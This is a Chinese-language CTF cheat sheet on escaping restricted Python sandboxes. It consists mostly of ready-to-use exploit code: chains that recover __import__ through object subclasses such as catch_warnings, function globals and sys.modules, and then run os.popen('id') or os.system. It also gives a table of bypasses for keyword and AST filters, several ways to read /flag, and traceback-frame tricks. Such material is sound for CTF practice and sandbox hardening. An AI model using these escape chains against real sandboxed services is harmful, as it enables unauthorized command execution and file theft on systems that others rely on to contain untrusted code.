# Python 沙箱逃逸

题目给一个「执行 Python 代码但限制 `__builtins__`」的服务时，**目标不是写业务逻辑，是找到能跳出沙箱的那个对象**。

## 0. 先确认沙箱边界（三行探针）

```python
print(type(__builtins__))                 # dict / module / 被换成了白名单 dict
print(sorted(__builtins__.keys())[:20])   # 少了 __import__ / open / eval 就是白名单制
print([c.__name__ for c in ().__class__.__base__.__subclasses__()][:10])
```

- `__builtins__` 是 dict 且没有 `__import__` → 典型受限环境
- 连 `().__class__` 都被拦 → 换 `''.__class__`、`[].__class__`、`{}.__class__`
- 报 `'xxx' object has no attribute '__class__'` → 可能被 AST 过滤，换等价写法

## 1. 最小的逃逸链（按成功率排序）

```python
# ① catch_warnings（最常被漏掉）
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()\
  ._module.__builtins__['__import__']('os').popen('id').read()

# ② object 的任意带 __init__.__globals__ 的类
().__class__.__base__.__subclasses__()[N].__init__.__globals__['__builtins__']['__import__']('os').system('id')

# ③ 直接拿 sys.modules（很多时候没清）
import sys
sys.modules['os'].popen('id').read()

# ④ 函数默认参数 / 闭包
(lambda: 0).__globals__['__builtins__']

# ⑤ 被遗忘的模块级对象
breakpoint()      # 有些环境留着 pdb
help()            # pydoc 里有 os
license           # 老版本 CPython 会开一个 pager
```

**没有 `__import__` 时，用 `__builtins__` 这个 dict 本身**：
上面 ① 里的 `._module.__builtins__['__import__']` 就是从别的模块借一份**完整的** builtins。

## 2. 找子类下标

不要硬编码 `().__class__.__base__.__subclasses__()[141]`：

```python
names = [x.__name__ for x in ().__class__.__base__.__subclasses__()]
idx = names.index('catch_warnings')
```

能一次打印就别猜两次。服务如果会回显异常，`IndexError` 也能反推出表长。

## 3. 被 AST / 关键字过滤时

| 拦了什么 | 换成 |
|---|---|
| `import` 关键字 | `__import__('os')`、`__builtins__['__import__']` |
| `eval` / `exec` | `getattr(__builtins__,'eval')`、`compile` |
| 字面量 `__class__` | `getattr(o,'__cla'+'ss__')` |
| 括号 / 下划线 | 用 `str.join` 拼：`getattr(o, ''.join(['__','class','__']))` |
| `open` | `__builtins__['open']`、`io.FileIO`、`os.popen('cat f')` |
| 输出被吞 | 把结果 `return` 出去（很多服务会把 return 值序列化回显），或写进响应头/文件名 |

## 4. 没 `os` 也能读文件

```python
__builtins__['open']('/flag').read()
import io; io.FileIO('/flag').read()
import pathlib; pathlib.Path('/flag').read_text()
import subprocess; subprocess.check_output(['cat','/flag'])
```

## 5. 常见坑

- **`__builtins__` 在被 import 的模块里是 dict、在 `__main__` 里是 module** —— 两种形态都写一遍 `['x']` / `.x`。
- 多数沙箱只限制 builtins，**不限制异常对象**：`except Exception as e: e.__traceback__.tb_frame.f_globals` 也是一条路。
- 执行有超时，别写长循环；一次 `popen` 把所有要看的都打印出来（`ls / ; cat /flag*`）。
- 回显被截断时限流输出：`head -c 2000`、`find / -name '*flag*' 2>/dev/null | head`。
